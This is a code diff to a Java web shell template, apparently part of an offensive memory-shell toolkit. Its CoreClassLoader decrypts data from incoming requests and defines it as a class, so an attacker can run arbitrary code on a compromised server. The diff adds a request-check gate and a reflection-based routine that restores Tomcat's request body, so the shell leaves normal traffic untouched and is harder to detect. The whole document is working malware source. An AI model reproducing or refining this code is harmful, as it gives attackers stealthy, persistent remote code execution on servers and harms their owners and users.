@@ -104,13 +104,16 @@ public class CoreClassLoader extends ClassLoader implements InvocationHandler {
 
     {globalCode}
 
+    private byte[] shellBodySaved = null;
+
     private boolean entry(Object request, Object response) {
         try {
+            if ({requestCheck}){
                 {variable}
                 {requestChannel}
                 {requestDecryptionChain}
                 if (requestData==null || requestData.length==0){
-                    return true;
+                    return false;
                 }
                 if (payload == null){
                     payload = new CoreClassLoader(getClass().getClassLoader()).defineClass(requestData,0,requestData.length);
@@ -141,8 +144,39 @@ public class CoreClassLoader extends ClassLoader implements InvocationHandler {
                     } catch(Exception e) {}
                     return true;
                 }
+            }
         } catch (Throwable e) {}
+        finally {
+            restoreRequestBody(request);
+        }
         return false;
+    }
+
+    // raw body 通道读过的请求体接回 Tomcat 底层 input buffer，正常 POST 的参数/body 不被吃
+    private void restoreRequestBody(Object request) {
+        byte[] saved = this.shellBodySaved;
+        this.shellBodySaved = null;
+        if (saved == null || saved.length == 0) {
+            return;
+        }
+        try {
+            Object cur = request;
+            Field inner = getField(cur, "request");
+            if (inner != null) {
+                cur = inner.get(cur);
+            }
+            Object coyote = getFieldValue(cur, "coyoteRequest");
+            if (coyote != null) {
+                cur = coyote;
+            }
+            Object inputBuffer = getFieldValue(cur, "inputBuffer");
+            if (inputBuffer != null) {
+                Method m = inputBuffer.getClass().getMethod("setInputStream", InputStream.class);
+                m.setAccessible(true);
+                m.invoke(inputBuffer, new java.io.ByteArrayInputStream(saved));
+            }
+        } catch (Throwable e) {
+        }
     }
 
     public static void setFieldValue(Object obj, String fieldName,Object value) throws Exception {
